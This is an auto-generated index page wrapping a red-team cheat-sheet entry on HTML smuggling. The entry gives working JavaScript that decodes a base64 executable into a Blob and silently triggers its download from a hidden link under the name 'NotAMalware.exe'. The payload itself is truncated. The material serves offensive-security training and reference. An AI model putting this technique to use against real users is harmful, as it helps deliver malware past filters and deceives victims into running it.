---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# HTML Smuggling

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-html-smuggling` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/html-smuggling.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [HTML Smuggling](../../topics/redteam/html-smuggling.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-html-smuggling |
| name | HTML Smuggling |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/html-smuggling.md |

## Preserved Source Material

````yaml
_body: "# HTML Smuggling\n\n## Summary\n\n- [Description](#description)\n- [Executable Storage](#executable-storage)\n\n##\
  \ Description\n\nHTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download\
  \ our malicious file.\n\n## Executable storage\n\nWe can store our payload in a Blob object => JS: `var blob = new Blob([data],\
  \ {type: 'octet/stream'});`\nTo perform the download, we need to create an Object Url => JS: `var url = window.URL.createObjectURL(blob);`\n\
  With those two elements, we can create with Javascript our \\<a> tag which will be used to download our malicious file:\n\
  \n```Javascript\nvar a = document.createElement('a');\ndocument.body.appendChild(a);\na.style = 'display: none';\nvar url\
  \ = window.URL.createObjectURL(blob);\na.href = url;\na.download = fileName;\na.click();\nwindow.URL.revokeObjectURL(url);\n\
  ```\n\nTo store ou payload, we use base64 encoding:\n\n```Javascript\nfunction base64ToArrayBuffer(base64) {\n var binary_string\
  \ = window.atob(base64);\n var len = binary_string.length;\n var bytes = new Uint8Array( len );\n for (var i = 0; i < len;\
  \ i++) { bytes[i] = binary_string.charCodeAt(i); }\n return bytes.buffer;\n}\n       \nvar file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...\n\
  var data = base64ToArrayBuffer(file);\nvar blob = new Blob([data], {type: 'octet/stream'});\nvar fileName = 'NotAMalware.exe';\n\
  ```"
_relative_path: redteam/access/html-smuggling.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/html-smuggling.md
````
